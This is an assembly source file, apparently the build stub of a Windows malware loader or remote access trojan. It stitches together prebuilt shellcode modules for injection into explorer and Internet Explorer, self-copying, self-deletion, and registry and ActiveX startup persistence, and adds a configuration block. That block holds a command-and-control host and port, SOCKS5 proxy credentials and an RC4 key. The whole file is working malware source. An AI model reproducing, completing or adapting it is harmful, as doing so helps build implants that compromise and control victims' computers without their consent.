include 'win32ax.inc'
include 'include/global.inc'

.code
start:
	call main
	invoke ExitProcess, 0
	
main:
	file 'loader_main/loader_main.bin'
	CONFIG_BEGIN mutex_name
		db 'test2222'
	CONFIG_END mutex_name
	
	CONFIG_BEGIN persistence
		db true
	CONFIG_END persistence

	CONFIG_BEGIN melt
		db true
	CONFIG_END melt

	CONFIG_BEGIN copy_method
		db COPY_METHOD_TO_WINDOWS
	CONFIG_END copy_method

	CONFIG_BEGIN copy_to
		du 'hello.exe'
	CONFIG_END copy_to

	CONFIG_BEGIN startup_hklm
		db true
	CONFIG_END startup_hklm

	CONFIG_BEGIN nklm_name
		du '≤‚ ‘'
	CONFIG_END nklm_name

	CONFIG_BEGIN startup_acitvex
		db true
	CONFIG_END startup_acitvex

	CONFIG_BEGIN activex_name
		du '≤‚ ‘'
	CONFIG_END activex_name

	CONFIG_BEGIN inject_to_ie
		db true
	CONFIG_END inject_to_ie

	CONFIG_BEGIN inject_to_custom
		db false
	CONFIG_END inject_to_custom

	CONFIG_BEGIN custom_process_name
		du 'notepad.exe'
	CONFIG_END custom_process_name

	CONFIG_BEGIN group
		du '≤‚ ‘∑÷◊È'
	CONFIG_END group

	CONFIG_BEGIN id
		du 'id'
	CONFIG_END id

	CONFIG_BEGIN dns_list
		db '127.0.0.1',0
		dw 8080
	CONFIG_END dns_list

	CONFIG_BEGIN socks5
		db false
	CONFIG_END socks5

	CONFIG_BEGIN socks5_dns
		db '127.0.0.1'
	CONFIG_END socks5_dns

	CONFIG_BEGIN socks5_port
		dw 8080
	CONFIG_END socks5_port

	CONFIG_BEGIN socks5_user
		db 'admin'
	CONFIG_END socks5_user

	CONFIG_BEGIN socks5_pass
		db 'admin'
	CONFIG_END socks5_pass

	CONFIG_BEGIN rc4_key
		db 'killeven'
	CONFIG_END rc4_key

	dw 0

	file 'extra_function/connect_by_socks5.bin'

	file 'loader_function/Release/inject_to_explorer.bin'

	file 'extra_function/add_startup_hklm_x86.bin'
	file 'extra_function/add_startup_activex_x86.bin'
	file 'extra_function/copy_self_x86.bin'
	file 'extra_function/find_process_by_name_x86.bin'

	file 'loader_function/Release/inject_to_explorer_code_x86.bin'

	file 'extra_function/get_kernel32_base_x64.bin'
	file 'extra_function/get_ntdll_base_x64.bin'
	file 'extra_function/get_proc_from_hash_x64.bin'

	file 'loader_function/x64/Release/add_startup_hklm_x64.bin'
	file 'loader_function/x64/Release/add_startup_activex_x64.bin'
	file 'loader_function/x64/Release/copy_self_x64.bin'
	file 'loader_function/x64/Release/find_process_by_name_x64.bin'
	file 'loader_function/x64/Release/inject_to_explorer_code_x64.bin'

	file 'extra_function/inject_to_explorer_code_x64_init.bin'

	dw 0
	
.end start